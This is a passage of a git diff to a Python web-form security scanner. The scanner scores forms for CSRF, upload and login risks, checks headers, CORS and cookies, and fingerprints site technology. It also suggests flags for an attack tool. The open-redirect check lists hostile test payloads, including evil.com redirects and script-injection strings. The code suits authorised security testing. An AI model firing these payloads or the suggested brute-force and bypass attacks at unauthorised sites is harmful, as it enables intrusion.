+            field_analysis.threat_level = 'critical'
+        elif threat_score >= 7:
+            field_analysis.threat_level = 'high'
+        elif threat_score >= 4:
+            field_analysis.threat_level = 'medium'
         elif threat_score >= 2:
-            field_analysis['threat_level'] = 'medium'
+            field_analysis.threat_level = 'low'
         else:
-            field_analysis['threat_level'] = 'low'
+            field_analysis.threat_level = 'info'
     
-    def assess_form_vulnerability(self, form_analysis):
+    def _assess_form_vulnerability_enhanced(self, form_analysis: FormAnalysis) -> None:
+        """Enhanced form vulnerability assessment."""
         score = 0
         indicators = []
         portswigger_vectors = []
         
-        #  GET - (PortSwigger: Reflected XSS)
-        if form_analysis['method'] == 'GET':
-            score += 2
-            indicators.append('get_method_used')
-            portswigger_vectors.append('reflected_xss_via_get')
-        
-        # no CSRF (PortSwigger: CSRF attacks)
-        has_csrf = any('csrf' in field['name'].lower() or 'token' in field['name'].lower() 
-                      for field in form_analysis['all_fields'])
-        if not has_csrf:
+        # Method-based risks
+        if form_analysis.method == 'GET':
             score += 3
+            indicators.append('get_method_data_exposure')
+            portswigger_vectors.extend(['reflected_xss_via_get', 'url_parameter_injection'])
+        
+        # CSRF assessment
+        has_csrf = any('csrf' in field.name.lower() or 'token' in field.name.lower() 
+                      for field in form_analysis.all_fields)
+        if not has_csrf:
+            score += 5
             indicators.append('no_csrf_protection')
-            portswigger_vectors.append('csrf_vulnerable')
+            portswigger_vectors.append('csrf_vulnerable_form')
         
-        # validaiton missing (PortSwigger: Input validation bypass)
-        unvalidated_text_fields = sum(1 for field in form_analysis['text_input_fields'] 
-                                    if 'no_client_side_validation' in field['suspicious_patterns'])
-        if unvalidated_text_fields > 0:
-            score += unvalidated_text_fields
-            indicators.append(f'{unvalidated_text_fields}_unvalidated_text_fields')
-            portswigger_vectors.append('input_validation_bypass')
-        
-        # Login:Pass(PortSwigger: Authentication attacks)
-        login_fields = sum(1 for field in form_analysis['text_input_fields'] if field['field_category'] == 'login')
-        password_fields = sum(1 for field in form_analysis['text_input_fields'] if field['field_category'] == 'password')
+        # Authentication analysis
+        login_fields = sum(1 for field in form_analysis.text_input_fields if field.field_category == 'login')
+        password_fields = sum(1 for field in form_analysis.text_input_fields if field.field_category == 'password')
         
         if login_fields > 0 and password_fields > 0:
-            score += 2
+            score += 4
             indicators.append('login_form_detected')
-            portswigger_vectors.extend(['credential_stuffing', 'brute_force_login'])
+            portswigger_vectors.extend(['authentication_bypass', 'credential_stuffing', 'brute_force'])
+            
+            # Check for rate limiting indicators
+            if not any('attempt' in field.name.lower() or 'captcha' in field.name.lower() 
+                      for field in form_analysis.all_fields):
+                indicators.append('possible_no_rate_limiting')
+                portswigger_vectors.append('brute_force_no_ratelimit')
         
-        # File upload (PortSwigger: File upload vulnerabilities)
-        if any(field['field_category'] == 'file_upload' for field in form_analysis['all_fields']):
-            score += 3
+        # File upload risks
+        upload_fields = [f for f in form_analysis.all_fields if f.field_category == 'file_upload']
+        if upload_fields:
+            score += 5
             indicators.append('file_upload_detected')
-            portswigger_vectors.extend(['malicious_file_upload', 'stored_xss_via_files'])
+            portswigger_vectors.extend(['malicious_file_upload', 'stored_xss_via_files', 'rce_via_upload'])
+            
+            # Check for file type restrictions
+            if not any('accept' in f.attributes for f in upload_fields):
+                indicators.append('no_file_type_restriction')
+                portswigger_vectors.append('unrestricted_file_upload')
         
-        # Hidden fields with values (PortSwigger: Insecure direct object references)
-        hidden_with_values = sum(1 for field in form_analysis['all_fields'] 
-                               if 'hidden_field_with_value' in field['suspicious_patterns'])
-        if hidden_with_values > 0:
-            score += 2
+        # Hidden field analysis
+        hidden_with_values = [f for f in form_analysis.all_fields 
+                             if 'hidden_field_with_value' in f.suspicious_patterns]
+        if hidden_with_values:
+            score += 3
             indicators.append('hidden_fields_with_values')
             portswigger_vectors.append('idor_via_hidden_fields')
         
-        # Choice fields with predefined values (Parameter tampering)
-        choice_fields = sum(1 for field in form_analysis['non_text_fields'] 
-                          if field['field_category'] == 'choice')
-        if choice_fields > 0:
-            score += 1
-            indicators.append(f'{choice_fields}_choice_fields')
-            portswigger_vectors.append('parameter_tampering')
+        # Validation analysis
+        unvalidated_fields = [f for f in form_analysis.text_input_fields 
+                            if 'no_client_side_validation' in f.suspicious_patterns]
+        if unvalidated_fields:
+            score += len(unvalidated_fields) * 2
+            indicators.append(f'{len(unvalidated_fields)}_unvalidated_fields')
+            portswigger_vectors.append('input_validation_bypass')
         
-        form_analysis['complexity_score'] = score
-        form_analysis['vulnerability_indicators'] = indicators
-        form_analysis['portswigger_vectors'] = portswigger_vectors
-    
-    def detect_portswigger_vectors(self, form_analysis):
-        if any(field['field_category'] in ['search', 'content'] for field in form_analysis['text_input_fields']):
-            form_analysis['portswigger_vectors'].append('dom_xss_potential')
-
-        if form_analysis['method'] == 'GET' and len(form_analysis['text_input_fields']) > 1:
-            form_analysis['portswigger_vectors'].append('http_parameter_pollution')
+        # Size/overflow risks
+        if len(form_analysis.all_fields) > 15:
+            score += 2
+            indicators.append('large_form_structure')
+            portswigger_vectors.append('size_overflow_attack')
         
-        if any('{{' in field.get('value', '') or '}}' in field.get('value', '') 
-               for field in form_analysis['text_input_fields']):
-            form_analysis['portswigger_vectors'].append('client_template_injection')
+        # Sensitive data exposure
+        if any(f.field_category == 'payment' for f in form_analysis.all_fields):
+            score += 5
+            indicators.append('payment_form_detected')
+            portswigger_vectors.extend(['payment_injection', 'sensitive_data_exposure'])
+        
+        form_analysis.complexity_score = score
+        form_analysis.vulnerability_indicators = indicators
+        form_analysis.portswigger_vectors = portswigger_vectors
     
-    async def analyze_security_headers(self):
-        try:
-            headers = {'User-Agent': self.user_agent}
+    def _detect_portswigger_vectors_enhanced(self, form_analysis: FormAnalysis) -> None:
+        """Enhanced PortSwigger vector detection."""
+        
+        # DOM XSS potential
+        if any(f.field_category in ['search', 'content', 'url'] 
+               for f in form_analysis.text_input_fields):
+            form_analysis.portswigger_vectors.append('dom_xss_potential')
+        
+        # Template injection
+        if any('{{' in f.value or '}}' in f.value or '${' in f.value 
+               for f in form_analysis.text_input_fields):
+            form_analysis.portswigger_vectors.append('template_injection_potential')
+        
+        # HTTP Parameter Pollution
+        if form_analysis.method == 'GET' and len(form_analysis.text_input_fields) > 2:
+            form_analysis.portswigger_vectors.append('http_parameter_pollution')
+        
+        # Prototype Pollution
+        if any('__proto__' in f.name.lower() or 'constructor' in f.name.lower() 
+               for f in form_analysis.all_fields):
+            form_analysis.portswigger_vectors.append('prototype_pollution')
+        
+        # Business logic flaws
+        if any(f.field_category == 'payment' for f in form_analysis.all_fields):
+            if any(f.field_category == 'choice' for f in form_analysis.all_fields):
+                form_analysis.portswigger_vectors.append('business_logic_price_manipulation')
+    
+    def _analyze_form_behavior(self, form_analysis: FormAnalysis) -> None:
+        """Analyze form behavior and event handlers."""
+        soup = BeautifulSoup(form_analysis.html_source, 'html.parser')
+        
+        # Check for JavaScript event handlers
+        event_handlers = [
+            'onclick', 'onsubmit', 'onchange', 'oninput', 'onfocus',
+            'onblur', 'onkeyup', 'onkeydown', 'onmouseover', 'onload'
+        ]
+        
+        for field in soup.find_all():
+            for handler in event_handlers:
+                if field.get(handler):
+                    form_analysis.vulnerability_indicators.append(
+                        f'event_handler_{handler}'
+                    )
+        
+        # Check for AJAX/API endpoints
+        if any('fetch' in str(field) or 'XMLHttpRequest' in str(field) 
+               for field in soup.find_all('script')):
+            form_analysis.vulnerability_indicators.append('ajax_form_submission')
+            form_analysis.portswigger_vectors.append('api_endpoint_testing')
+    
+    async def _analyze_security_headers_comprehensive(self) -> None:
+        """Comprehensive security headers analysis."""
+        security_headers_config = {
+            'Content-Security-Policy': {
+                'risk_level': ThreatLevel.HIGH,
+                'description': 'Content Security Policy',
+                'compliance': ['PCI DSS', 'HIPAA', 'GDPR'],
+                'recommendation': 'Implement strict CSP to prevent XSS attacks'
+            },
+            'X-Frame-Options': {
+                'risk_level': ThreatLevel.MEDIUM,
+                'description': 'Clickjacking Protection',
+                'compliance': ['OWASP Top 10'],
+                'recommendation': 'Set to DENY or SAMEORIGIN'
+            },
+            'Strict-Transport-Security': {
+                'risk_level': ThreatLevel.HIGH,
+                'description': 'HSTS Enforcement',
+                'compliance': ['PCI DSS', 'HIPAA'],
+                'recommendation': 'Enable HSTS with max-age >= 31536000'
+            },
+            'X-Content-Type-Options': {
+                'risk_level': ThreatLevel.LOW,
+                'description': 'MIME Type Sniffing Protection',
+                'compliance': ['OWASP Top 10'],
+                'recommendation': 'Set to nosniff'
+            },
+            'X-XSS-Protection': {
+                'risk_level': ThreatLevel.MEDIUM,
+                'description': 'XSS Filter',
+                'compliance': ['OWASP Top 10'],
+                'recommendation': 'Set to 1; mode=block'
+            },
+            'Referrer-Policy': {
+                'risk_level': ThreatLevel.LOW,
+                'description': 'Referrer Information Control',
+                'compliance': ['GDPR'],
+                'recommendation': 'Set to strict-origin-when-cross-origin'
+            },
+            'Permissions-Policy': {
+                'risk_level': ThreatLevel.MEDIUM,
+                'description': 'Feature Policy',
+                'compliance': ['OWASP Top 10'],
+                'recommendation': 'Restrict unnecessary browser features'
+            },
+            'Cross-Origin-Resource-Policy': {
+                'risk_level': ThreatLevel.HIGH,
+                'description': 'Cross-Origin Resource Sharing',
+                'compliance': ['OWASP Top 10'],
+                'recommendation': 'Set to same-origin or same-site'
+            },
+            'Cache-Control': {
+                'risk_level': ThreatLevel.MEDIUM,
+                'description': 'Cache Control',
+                'compliance': ['PCI DSS'],
+                'recommendation': 'Set to no-store for sensitive pages'
+            }
+        }
+        
+        headers_analysis = {}
+        
+        for header, config in security_headers_config.items():
+            value = self.response_headers.get(header.lower())
+            status = "✅ Present" if value else "❌ Missing"
             
-            async with aiohttp.ClientSession() as session:
-                async with session.head(self.url, headers=headers, proxy=self.proxies) as response:
-                    security_headers = {
-                        'Content-Security-Policy': response.headers.get('Content-Security-Policy'),
-                        'X-Frame-Options': response.headers.get('X-Frame-Options'),
-                        'X-Content-Type-Options': response.headers.get('X-Content-Type-Options'),
-                        'Strict-Transport-Security': response.headers.get('Strict-Transport-Security'),
-                        'X-XSS-Protection': response.headers.get('X-XSS-Protection'),
-                        'Referrer-Policy': response.headers.get('Referrer-Policy'),
-                        'Permissions-Policy': response.headers.get('Permissions-Policy')
-                    }
-                    
-                    self.results['security_headers'] = security_headers
-        except Exception as e:
-            console.print(f"[yellow]Warning: Could not analyze security headers: {str(e)}[/yellow]")
+            headers_analysis[header] = {
+                'value': value,
+                'status': status,
+                'risk_level': config['risk_level'].value,
+                'description': config['description'],
+                'compliance': config['compliance'],
+                'recommendation': config['recommendation'],
+                'is_compliant': value is not None
+            }
+        
+        # Additional header analysis
+        if 'set-cookie' in self.response_headers:
+            cookies = self.response_headers['set-cookie']
+            cookie_security = {
+                'httponly': 'httponly' in cookies.lower(),
+                'secure': 'secure' in cookies.lower(),
+                'samesite': 'samesite' in cookies.lower()
+            }
+            headers_analysis['Cookie-Security'] = {
+                'value': str(cookie_security),
+                'status': '⚠️ Partial' if not all(cookie_security.values()) else '✅ Secure',
+                'risk_level': 'high',
+                'description': 'Cookie Security Attributes',
+                'compliance': ['PCI DSS', 'GDPR'],
+                'recommendation': 'Set HttpOnly, Secure, and SameSite=Strict',
+                'is_compliant': all(cookie_security.values())
+            }
+        
+        self.results['security_headers'] = headers_analysis
     
-    async def detect_technology_stack(self, content):
-        soup = BeautifulSoup(content, 'html.parser')
+    async def _detect_technology_stack_advanced(self) -> None:
+        """Advanced technology stack detection."""
+        if not self.page_content:
+            return
+        
+        soup = BeautifulSoup(self.page_content, 'html.parser')
         tech_stack = {
             'frontend_frameworks': [],
             'backend_frameworks': [],
@@ -391,418 +975,327 @@ class FormAtionAnalyzer:
             'analytics': [],
             'cdn': [],
             'security_features': [],
+            'databases': [],
             'other_technologies': []
         }
         
+        # Script-based detection
         scripts = soup.find_all('script')
         for script in scripts:
             src = script.get('src', '').lower()
-            script_content = (script.string or '').lower()
+            content = (script.string or '').lower()
             
-            
-            script_attrs = []
-            for attr_value in script.attrs.values():
-                if isinstance(attr_value, list):
-                    script_attrs=extend(attr_value)
-                else:
-                    script_attrs.append(attr_value)
-            
-            script_attrs = ' '.join(str(val).lower() for val in script_attrs)
-            
-            # React
-            if any(indicator in src or indicator in script_content or indicator in script_attrs 
-                   for indicator in ['react', 'react-dom', 'react.production.min.js']):
-                tech_stack['frontend_frameworks'].append('React')
-            
-            # Vue.js
-            elif any(indicator in src or indicator in script_content 
-                    for indicator in ['vue', 'vue.js', 'vue.min.js']):
-                tech_stack['frontend_frameworks'].append('Vue.js')
-            
-            # Angular
-            elif any(indicator in src or indicator in script_content or 'ng-' in script_attrs
-                    for indicator in ['angular', 'angular.js', 'angular.min.js']):
-                tech_stack['frontend_frameworks'].append('Angular')
-            
-            # jQuery
-            elif any(indicator in src or indicator in script_content
-                    for indicator in ['jquery', 'jquery.min.js', 'jquery-']):
-                tech_stack['libraries'].append('jQuery')
-            
-            # Bootstrap
-            elif 'bootstrap' in src:
-                tech_stack['libraries'].append('Bootstrap')
-            
-            # Font Awesome
-            elif 'font-awesome' in src or 'fontawesome' in src:
-                tech_stack['libraries'].append('Font Awesome')
-            
-            # Google Analytics
-            elif 'google-analytics' in src or 'ga.js' in src or 'gtag' in src:
-                tech_stack['analytics'].append('Google Analytics')
-            
-            # Google Tag Manager
-            elif 'gtm.js' in src or 'googletagmanager' in src:
-                tech_stack['analytics'].append('Google Tag Manager')
-            
-            # Facebook Pixel
-            elif 'facebook.net' in src and 'pixel' in src:
-                tech_stack['analytics'].append('Facebook Pixel')
+            # Framework detection with version extraction
+            for framework, fingerprint in self.technology_fingerprints['frameworks'].items():
+                if any(pattern in src or pattern in content for pattern in fingerprint['patterns']):
+                    version = None
+                    if fingerprint.get('version_regex'):
+                        version_match = re.search(fingerprint['version_regex'], src + content)
+                        if version_match:
+                            version = version_match.group(1)
+                    
+                    tech_info = TechnologyInfo(
+                        name=framework,
+                        version=version,
+                        confidence='High',
+                        category=fingerprint['category'],
+                        evidence=f'Detected in script src/content'
+                    )
+                    
+                    if fingerprint['category'] == 'frontend':
+                        tech_stack['frontend_frameworks'].append(f"{framework} {version or ''}".strip())
+                    else:
+                        tech_stack['backend_frameworks'].append(f"{framework} {version or ''}".strip())
         
-        links = soup.find_all('link', rel='stylesheet')
-        for link in links:
-            href = link.get('href', '').lower()
-            
-            # Bootstrap CSS
-            if 'bootstrap' in href:
-                tech_stack['libraries'].append('Bootstrap')
-            
-            # Font Awesome CSS
-            elif 'font-awesome' in href or 'fontawesome' in href:
-                tech_stack['libraries'].append('Font Awesome')
-            
-            # Materialize CSS
-            elif 'materialize' in href:
-                tech_stack['libraries'].append('Materialize CSS')
-            
-            # Tailwind CSS
-            elif 'tailwind' in href:
-                tech_stack['libraries'].append('Tailwind CSS')
-
-        meta_tags = soup.find_all('meta')
-        for meta in meta_tags:
+        # Meta tag analysis
+        for meta in soup.find_all('meta'):
             name = meta.get('name', '').lower()
-            content_val = meta.get('content', '').lower()
-            http_equiv = meta.get('http-equiv', '').lower()
-            charset = meta.get('charset', '').lower()
+            content = meta.get('content', '').lower()
             
-            # Generatory CMS
-            if 'generator' in name:
-                if 'wordpress' in content_val:
-                    tech_stack['cms'].append('WordPress')
-                elif 'joomla' in content_val:
-                    tech_stack['cms'].append('Joomla')
-                elif 'drupal' in content_val:
-                    tech_stack['cms'].append('Drupal')
-                elif 'magento' in content_val:
-                    tech_stack['cms'].append('Magento')
-                elif 'shopify' in content_val:
-                    tech_stack['cms'].append('Shopify')
-                elif 'prestashop' in content_val:
-                    tech_stack['cms'].append('PrestaShop')
-                else:
-                    tech_stack['cms'].append(content_val)
-            
-            # CSRF protection
-            elif 'csrf-token' in name or 'csrf-token' in content_val:
-                tech_stack['security_features'].append('CSRF Protection')
-            
-            # Viewport - mobile framework indicator
-            elif name == 'viewport':
-                tech_stack['other_technologies'].append('Responsive Design')
-            
-            # X-UA-Compatible - IE compatibility
-            elif http_equiv == 'x-ua-compatible':
-                tech_stack['other_technologies'].append('IE Compatibility Mode')
+            # CMS detection
+            for cms, fingerprint in self.technology_fingerprints['cms'].items():
+                if 'generator' in name and cms.lower() in content:
+                    version_match = re.search(fingerprint['version_regex'], content)
+                    version = version_match.group(1) if version_match else None
+                    tech_stack['cms'].append(f"{cms} {version or ''}".strip())
         
-        comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
-        for comment in comments:
-            comment_text = comment.lower()
-            
-            # WordPress
-            if 'wordpress' in comment_text:
-                tech_stack['cms'].append('WordPress')
-            
-            # Joomla
-            elif 'joomla' in comment_text:
-                tech_stack['cms'].append('Joomla')
-            
-            # Drupal
-            elif 'drupal' in comment_text:
-                tech_stack['cms'].append('Drupal')
+        # URL path analysis
+        url_path = self.parsed_url.path.lower()
+        path_patterns = {
+            'WordPress': ['wp-content', 'wp-admin', 'wp-includes'],
+            'Drupal': ['sites/default', 'modules/', 'themes/'],
+            'Joomla': ['components/com_', 'modules/mod_', 'templates/'],
+            'Magento': ['skin/frontend', 'media/catalog'],
+            'PrestaShop': ['modules/', 'themes/', 'prestashop']
+        }
         
-        forms = soup.find_all('form')
-        for form in forms:
-            classes = form.get('class', [])
-            
-            attrs_list = []
-            for attr_value in form.attrs.values():
-                if isinstance(attr_value, list):
-                    attrs_list.extend(attr_value)
-                else: 
-                    attrs_list.append(attr_value)
-            attrs = ' '.join(str(val).lower() for val in attrs_list)
-            
-            action = form.get('action', '').lower()
-            id_attr = form.get('id', '').lower()
-            
-            # Django
-            if any('django' in str(cls).lower() for cls in classes) or 'csrfmiddlewaretoken' in attrs:
-                tech_stack['backend_frameworks'].append('Django')
-                tech_stack['programming_languages'].append('Python')
-            
-            # Laravel
-            elif any('laravel' in str(cls).lower() for cls in classes) or '_token' in attrs:
-                tech_stack['backend_frameworks'].append('Laravel')
-                tech_stack['programming_languages'].append('PHP')
-            
-            # Ruby on Rails
-            elif 'authenticity_token' in attrs or any('rails' in str(cls).lower() for cls in classes):
-                tech_stack['backend_frameworks'].append('Ruby on Rails')
-                tech_stack['programming_languages'].append('Ruby')
-            
-            # ASP.NET
-            elif '__viewstate' in attrs or '__eventvalidation' in attrs:
-                tech_stack['backend_frameworks'].append('ASP.NET')
-                tech_stack['programming_languages'].append('C#')
-            
-            # Spring
-            elif any('spring' in str(cls).lower() for cls in classes):
-                tech_stack['backend_frameworks'].append('Spring')
-                tech_stack['programming_languages'].append('Java')
+        for cms, patterns in path_patterns.items():
+            if any(pattern in url_path for pattern in patterns):
+                if not any(cms in t for t in tech_stack['cms']):
+                    tech_stack['cms'].append(cms)
         
-        divs = soup.find_all('div')
-        for div in divs[:50]:  
-            classes = div.get('class', [])
-            id_attr = div.get('id', '').lower()
-            
-            # WordPress specific
-            if any('wp-' in str(cls).lower() for cls in classes) or 'wp-' in id_attr:
-                tech_stack['cms'].append('WordPress')
-            
-            # Bootstrap specific
-            if any(('container' in str(cls).lower() or 'row' in str(cls).lower() or 
-                    'col-' in str(cls).lower()) for cls in classes):
-                tech_stack['libraries'].append('Bootstrap')
+        # Server header analysis
+        server = self.response_headers.get('server', '').lower()
+        if 'apache' in server:
+            tech_stack['web_servers'].append('Apache')
+        elif 'nginx' in server:
+            tech_stack['web_servers'].append('Nginx')
+        elif 'iis' in server:
+            tech_stack['web_servers'].append('Microsoft IIS')
+        elif 'litespeed' in server:
+            tech_stack['web_servers'].append('LiteSpeed')
         
-        if self.results.get('server'):
-            server = self.results['server'].lower()
-            
-            # Web servers
-            if 'apache' in server:
-                tech_stack['web_servers'].append('Apache')
-            elif 'nginx' in server:
-                tech_stack['web_servers'].append('Nginx')
-            elif 'iis' in server:
-                tech_stack['web_servers'].append('IIS')
-                tech_stack['programming_languages'].append('ASP.NET')
-            elif 'litespeed' in server:
-                tech_stack['web_servers'].append('LiteSpeed')
-            elif 'caddy' in server:
-                tech_stack['web_servers'].append('Caddy')
-            
-            # Backend technologies via Server header
-            if 'php' in server:
-                tech_stack['programming_languages'].append('PHP')
-            elif 'python' in server:
-                tech_stack['programming_languages'].append('Python')
-            elif 'node' in server:
-                tech_stack['programming_languages'].append('JavaScript (Node.js)')
-            elif 'ruby' in server:
-                tech_stack['programming_languages'].append('Ruby')
-            elif 'java' in server:
-                tech_stack['programming_languages'].append('Java')
+        # Language detection
+        powered_by = self.response_headers.get('x-powered-by', '').lower()
+        language_indicators = {
+            'php': 'PHP', 'asp.net': 'C#/ASP.NET', 'node': 'Node.js',
+            'python': 'Python', 'ruby': 'Ruby', 'java': 'Java',
+            'perl': 'Perl', 'go': 'Go'
+        }
         
-        if hasattr(self, 'response_headers'):
-            powered_by = self.response_headers.get('x-powered-by', '').lower()
-            if 'php' in powered_by:
-                tech_stack['programming_languages'].append('PHP')
-            elif 'asp.net' in powered_by:
-                tech_stack['backend_frameworks'].append('ASP.NET')
-            elif 'express' in powered_by:
-                tech_stack['backend_frameworks'].append('Express.js')
-                tech_stack['programming_languages'].append('JavaScript (Node.js)')
-
-        all_srcs = [script.get('src', '').lower() for script in scripts] + \
-                   [link.get('href', '').lower() for link in soup.find_all('link')] + \
-                   [img.get('src', '').lower() for img in soup.find_all('img')]
+        for indicator, language in language_indicators.items():
+            if indicator in server or indicator in powered_by:
+                tech_stack['programming_languages'].append(language)
         
-        for src in all_srcs:
-            # Cloudflare
-            if 'cloudflare' in src:
-                tech_stack['cdn'].append('Cloudflare')
-            # AWS CloudFront
-            elif 'cloudfront' in src:
-                tech_stack['cdn'].append('AWS CloudFront')
-            # Google Cloud CDN
-            elif 'googleapis' in src or 'gstatic' in src:
-                tech_stack['cdn'].append('Google CDN')
-            # Microsoft Azure CDN
-            elif 'azure' in src:
-                tech_stack['cdn'].append('Azure CDN')
-            # jQuery CDN
-            elif 'code.jquery.com' in src:
-                tech_stack['cdn'].append('jQuery CDN')
-            # Bootstrap CDN
-            elif 'bootstrapcdn' in src:
-                tech_stack['cdn'].append('Bootstrap CDN')
-            # CDNJS
-            elif 'cdnjs' in src:
-                tech_stack['cdn'].append('CDNJS')
-        
-        if hasattr(self, 'response_headers'):
-            cookies = self.response_headers.get('set-cookie', '')
-            if 'wordpress' in cookies.lower() or 'wp-' in cookies.lower():
-                tech_stack['cms'].append('WordPress')
-            elif 'joomla' in cookies.lower():
-                tech_stack['cms'].append('Joomla')
-            elif 'drupal' in cookies.lower():
-                tech_stack['cms'].append('Drupal')
-            elif 'laravel' in cookies.lower() or 'laravel_session' in cookies.lower():
-                tech_stack['backend_frameworks'].append('Laravel')
-        
-        parsed_url = urlparse(self.url)
-        path = parsed_url.path.lower()
-        
-        if '/wp-content/' in path or '/wp-admin/' in path or '/wp-includes/' in path:
-            tech_stack['cms'].append('WordPress')
-
-        if '/media/system/' in path or '/components/com_' in path:
-            tech_stack['cms'].append('Joomla')
-
-        if '/sites/default/' in path or '/modules/' in path:
-            tech_stack['cms'].append('Drupal')
-        
-        categories_to_remove = []
+        # Clean up and deduplicate
         for category in tech_stack:
             tech_stack[category] = list(set(tech_stack[category]))
             if not tech_stack[category]:
-                categories_to_remove.append(category)
-                
-        for category in categories_to_remove:
-            del tech_stack[category]
-            
+                del tech_stack[category]
         
         self.results['technology_stack'] = tech_stack
-
-    def generate_recommendations(self):
+    
+    async def _run_advanced_security_checks(self) -> None:
+        """Run advanced security checks and tests."""
+        
+        # Check for CORS misconfiguration
+        await self._check_cors_configuration()
+        
+        # Analyze cookies
+        self._analyze_cookies_security()
+        
+        # Check for information disclosure
+        self._check_information_disclosure()
+        
+        # Analyze redirect behavior
+        await self._analyze_redirect_behavior()
+    
+    async def _check_cors_configuration(self) -> None:
+        """Check CORS configuration."""
+        cors_headers = [
+            'access-control-allow-origin',
+            'access-control-allow-methods',
+            'access-control-allow-headers',
+            'access-control-allow-credentials',
+            'access-control-expose-headers',
+            'access-control-max-age'
+        ]
+        
+        cors_config = {}
+        for header in cors_headers:
+            value = self.response_headers.get(header)
+            if value:
+                cors_config[header] = value
+        
+        if cors_config:
+            is_weak = False
+            if 'access-control-allow-origin' in cors_config:
+                if cors_config['access-control-allow-origin'] == '*':
+                    is_weak = True
+                    self.results['attack_vectors'].append('CORS_Wildcard_Misconfiguration')
+                elif cors_config.get('access-control-allow-credentials') == 'true':
+                    is_weak = True
+                    self.results['attack_vectors'].append('CORS_Credentials_With_Reflected_Origin')
+            
+            self.results['cors_configuration'] = {
+                'headers': cors_config,
+                'is_weak': is_weak
+            }
+    
+    def _analyze_cookies_security(self) -> None:
+        """Analyze cookie security attributes."""
+        set_cookie = self.response_headers.get('set-cookie', '')
+        if not set_cookie:
+            return
+        
+        cookies_analysis = []
+        for cookie in set_cookie.split(','):
+            cookie = cookie.strip()
+            cookie_name = cookie.split('=')[0] if '=' in cookie else 'Unknown'
+            
+            security_flags = {
+                'secure': 'secure' in cookie.lower(),
+                'httponly': 'httponly' in cookie.lower(),
+                'samesite': 'samesite' in cookie.lower()
+            }
+            
+            # Extract SameSite value
+            samesite_match = re.search(r'samesite=(\w+)', cookie, re.IGNORECASE)
+            samesite_value = samesite_match.group(1) if samesite_match else None
+            
+            cookies_analysis.append({
+                'name': cookie_name,
+                'security_flags': security_flags,
+                'samesite_value': samesite_value,
+                'is_secure': all(security_flags.values())
+            })
+        
+        self.results['cookie_analysis'] = cookies_analysis
+    
+    def _check_information_disclosure(self) -> None:
+        """Check for information disclosure in page content."""
+        if not self.page_content:
+            return
+        
+        disclosure_patterns = {
+            'email_addresses': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
+            'api_keys': r'(?i)(?:api|auth|key|token|secret)[:=\s]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
+            'internal_paths': r'(?:/var/www|/home/\w+|C:\\inetpub|C:\\xampp)',
+            'debug_info': r'(?i)(?:stack trace|debug|error|warning|notice):',
+            'version_numbers': r'(?i)(?:version|ver|v)\s*[:=]?\s*([0-9]+\.[0-9]+\.[0-9]+)'
+        }
+        
+        disclosures = {}
+        for disclosure_type, pattern in disclosure_patterns.items():
+            matches = re.findall(pattern, self.page_content)
+            if matches:
+                disclosures[disclosure_type] = list(set(matches))[:5]  # Limit to first 5
+        
+        if disclosures:
+            self.results['information_disclosure'] = disclosures
+    
+    async def _analyze_redirect_behavior(self) -> None:
+        """Analyze redirect behavior for open redirect vulnerabilities."""
+        if not self.session:
+            return
+        
+        # Test with common redirect payloads
+        redirect_payloads = [
+            'https://evil.com',
+            '//evil.com',
+            '/\\evil.com',
+            'https:evil.com',
+            'javascript:alert(1)',
+            'data:text/html,<script>alert(1)</script>'
+        ]
+        
+        # Check if any URL parameters might be redirect parameters
+        parsed = urlparse(self.url)
+        params = parse_qs(parsed.query)
+        
+        redirect_params = []
+        redirect_indicators = ['redirect', 'url', 'next', 'return', 'goto', 'target', 'redir']
+        
+        for param in params:
+            if any(indicator in param.lower() for indicator in redirect_indicators):
+                redirect_params.append(param)
+        
+        if redirect_params:
+            self.results['redirect_analysis'] = {
+                'potential_params': redirect_params,
+                'test_payloads': redirect_payloads[:3],
+                'risk': 'Open Redirect Potential'
+            }
+            self.results['attack_vectors'].append('Open_Redirect')
+    
+    def _generate_recommendations_enhanced(self) -> None:
+        """Generate enhanced recommendations based on all findings."""
         recommendations = []
         formpoison_flags = []
-        attack_vectors = []
+        attack_vectors = set()
         
         for form in self.results['forms_analysis']:
             form_id = form['form_id']
             
-            if form['complexity_score'] >= 5:
-                recommendations.append(f"Form {form_id}: High vulnerability potential (Score: {form['complexity_score']})")
+            # Complexity-based recommendations
+            if form['complexity_score'] >= 10:
+                recommendations.append(f"[CRITICAL] Form {form_id}: Extremely high vulnerability potential (Score: {form['complexity_score']})")
+            elif form['complexity_score'] >= 7:
+                recommendations.append(f"[HIGH] Form {form_id}: High vulnerability potential (Score: {form['complexity_score']})")
             
-            text_fields_count = len(form['text_input_fields'])
-            non_text_fields_count = len(form['non_text_fields'])
-            
-            console.print(f"[dim]Form {form_id}: {text_fields_count} text fields, {non_text_fields_count} non-text fields[/dim]")
-            
+            # Authentication forms
             if 'login_form_detected' in form['vulnerability_indicators']:
-                recommendations.append(f"Form {form_id}: Login form detected - test authentication bypass (PortSwigger: Authentication)")
-                formpoison_flags.append("--login")
-                attack_vectors.append("Authentication Bypass")
+                recommendations.append(f"Form {form_id}: Test authentication bypass techniques")
+                formpoison_flags.extend(['--login', '--auth-bypass'])
+                attack_vectors.add('Authentication Bypass')
+                
+                if 'possible_no_rate_limiting' in form['vulnerability_indicators']:
+                    recommendations.append(f"Form {form_id}: Possible lack of rate limiting - test credential stuffing")
+                    formpoison_flags.append('--brute-force')
+                    attack_vectors.add('Brute Force')
             
-            if any(field['field_category'] == 'file_upload' for field in form['all_fields']):
-                recommendations.append(f"Form {form_id}: File upload - test for XSS in filenames (PortSwigger: File Upload XSS)")
-                formpoison_flags.append("--filemode")
-                attack_vectors.append("File Upload XSS")
+            # File upload forms
+            if 'file_upload_detected' in form['vulnerability_indicators']:
+                recommendations.append(f"Form {form_id}: Test file upload vulnerabilities")
+                formpoison_flags.extend(['--filemode', '--upload-test'])
+                attack_vectors.add('File Upload Attack')
+                
+                if 'no_file_type_restriction' in form['vulnerability_indicators']:
+                    recommendations.append(f"Form {form_id}: No file type restrictions - test malicious upload")
+                    formpoison_flags.append('--unrestricted-upload')
             
-            if 'get_method_used' in form['vulnerability_indicators']:
-                recommendations.append(f"Form {form_id}: GET method - test for reflected XSS (PortSwigger: Reflected XSS)")
-                formpoison_flags.append("--method GET")
-                attack_vectors.append("Reflected XSS")
+            # XSS vectors
+            xss_vectors = [v for v in form['portswigger_vectors'] if 'xss' in v.lower()]
+            if xss_vectors:
